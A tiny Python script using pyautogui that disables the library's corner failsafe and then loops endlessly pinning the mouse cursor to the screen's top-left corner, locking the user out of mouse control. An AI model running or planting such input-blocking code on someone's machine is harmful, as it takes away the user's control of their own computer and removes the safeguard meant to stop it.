import pyautogui

def block_input():
    pyautogui.FAILSAFE = False 

    while True:
        pyautogui.moveTo(0, 0)
if __name__ == "__main__":
    block_input()
